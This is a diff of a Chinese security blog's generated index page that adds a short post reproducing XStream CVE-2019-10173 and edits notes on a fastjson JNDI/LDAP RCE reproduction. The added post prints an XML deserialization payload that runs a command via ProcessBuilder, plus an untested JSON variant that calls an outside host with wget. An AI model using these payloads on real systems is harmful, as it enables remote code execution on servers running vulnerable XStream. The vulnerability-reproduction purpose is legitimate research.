@@ -292,6 +292,151 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/xstream-1.4.10反序列化漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/25/xstream-1.4.10反序列化漏洞/" itemprop="url">fastjson的RCE漏洞复现记录</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T02:21:30+08:00">
+                2019-07-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-CVE-2019-10173"><a href="#0x00-CVE-2019-10173" class="headerlink" title="0x00 CVE-2019-10173"></a>0x00 CVE-2019-10173</h2><p>参考<a href="http://x-stream.github.io/changes.html#1.4.11" target="_blank" rel="noopener">http://x-stream.github.io/changes.html#1.4.11</a></p>
+<h2 id="0x01-payload"><a href="#0x01-payload" class="headerlink" title="0x01 payload"></a>0x01 payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>ping xxxxx<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可能的变形：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"sorted-set":&#123;"string":"foo","dynamic-proxy":&#123;"interface":"java.lang.Comparable","handler":&#123;"class":"java.beans.EventHandler","target":&#123;"class":"java.lang.ProcessBuilder","command":"wget http://2nmquk.ceye.io"&#125;,"action":"start"&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-说明"><a href="#0x02-说明" class="headerlink" title="0x02 说明"></a>0x02 说明</h2><p>XML的payload是没问题的，json这些是改的，不见得可以，不过xstream的反序列化函数确实是支持json和XML同时传入的</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/13/fastjson的RCE漏洞复现记录/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -403,16 +548,16 @@
 </ol>
 <p>关于服务搭建，建议不要搭建rmi服务，因为目前看来和ldap等价，而ldap服务具有饶过的可能，因此直接使用ldap就好了。如果使用饶过则需要修改ladp服务器的部分代码，依旧是参考上面饶过的那篇文章最后提到的那段。<a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/tree/master/PoC" target="_blank" rel="noopener">bypass的github</a><br>关于代码修改后的编译问题：</p>
 <ol>
-<li>mvn compile   会生产class文件</li>
-<li>mvn install  不仅会生产class还会生产jar</li>
+<li>mvn compile   会生产class文件，会产生不带依赖的jar包</li>
+<li>mvn install  不仅会生产class还会生产jar和带依赖的jar</li>
 <li>如果部分版本冲突可以尝试修改pom文件里的版本信息</li>
-<li>如果自己启动ldap需要mvn将依赖打包后，通过java命令指定依赖位置来执行</li>
+<li>java -cp Jar 包地址 person.server.LdapServer 就可以启动ldap服务，这个是通过编译的来的jar包里的class启动的server，通过marshalsec的话也是启动的marshalsec包里的ldap服务</li>
 </ol>
 <h2 id="0x06-扩展"><a href="#0x06-扩展" class="headerlink" title="0x06 扩展"></a>0x06 扩展</h2><p>由于饶过姿势太多，后续可能考虑编写一个统一的检测工具，依赖于修改ldap服务器使其针对不同的请求返回不同的利用链payload，依照这个思路来做检测。</p>
 <h2 id="0x07-关于java反序列化"><a href="#0x07-关于java反序列化" class="headerlink" title="0x07 关于java反序列化"></a>0x07 关于java反序列化</h2><p>几个工具可以看一下</p>
 <ol>
 <li><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener"> marshalsec </a></li>
-<li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener"> ysoserial </a><br>Java反序列化备忘录文章<a href="https://xz.aliyun.com/t/2042" target="_blank" rel="noopener">备忘录</a><br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">javaruntime.exec payload生成</a></li>
+<li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener"> ysoserial </a><br>Java反序列化备忘录文章<a href="https://xz.aliyun.com/t/2042" target="_blank" rel="noopener">备忘录</a><br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">javaruntime.exec payload生成</a><br>KM29Nw2ydMpJ8kRz</li>
 </ol>
 
           
@@ -1700,137 +1845,13 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/27/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/27/hello-world/" itemprop="url">Hello World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-27T10:03:48+08:00">
-                2019-03-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -1876,7 +1897,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1898,7 +1919,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
